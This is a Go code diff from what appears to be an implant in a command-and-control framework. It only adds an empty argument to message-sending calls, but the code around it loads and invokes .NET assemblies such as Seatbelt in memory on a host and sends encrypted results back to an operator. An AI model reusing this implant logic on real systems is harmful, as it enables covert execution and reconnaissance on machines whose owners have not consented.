@@ -51,11 +51,11 @@ func assemblyLoadCmd(sendUserId, decData string) {
 	if result.Stderr == "" {
 		data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "successfully loaded "+filename+" into the default AppDomain")
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg)
+		common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg, "")
 	} else {
 		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, result.Stderr)
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg, "")
 	}
 	debug.DebugPrint(result.Stdout)
 }
@@ -64,7 +64,7 @@ func assemblyListCmd(sendUserId string) {
 	assemblyNames := assemblyopt.GetAssemblyNames(assemblyopt.Assemblies)
 	jsonData, _ := json.Marshal(assemblyNames)
 	data, _ := crypto.Encrypt(jsonData, []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyList_ret", data)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyList_ret", data, "")
 }
 
 func assemblyInvokeCmd(sendUserId, decData string) {
@@ -73,7 +73,7 @@ func assemblyInvokeCmd(sendUserId, decData string) {
 	if len(args) == 0 {
 		out := colorcode.OutputMessage(colorcode.SIGN_ERROR, "Please enter the parameters of the assembly, eg: Seatbelt.exe -group=system")
 		data, _ := crypto.Encrypt([]byte(out), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
+		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data, "")
 		return
 	}
 	assemblyName := strings.ToLower(args[0])
@@ -82,7 +82,7 @@ func assemblyInvokeCmd(sendUserId, decData string) {
 	if !exist {
 		outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, " the "+assemblyName+" assembly is not loaded")
 		data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
+		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data, "")
 		return
 	}
 	result := assemblyopt.InvokeAssembly(args)
@@ -90,17 +90,17 @@ func assemblyInvokeCmd(sendUserId, decData string) {
 		if result.Stderr != "" {
 			outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, result.Stderr)
 			data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
+			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data, "")
 		} else {
 			outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "assembly invoke fail")
 			data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
+			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data, "")
 		}
 		return
 	}
 	out := util.ConvertByte2String([]byte(result.Stdout), "GB18030")
 	data, _ := crypto.Encrypt([]byte(out), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data, "")
 	debug.DebugPrint(result.Stdout)
 }
 
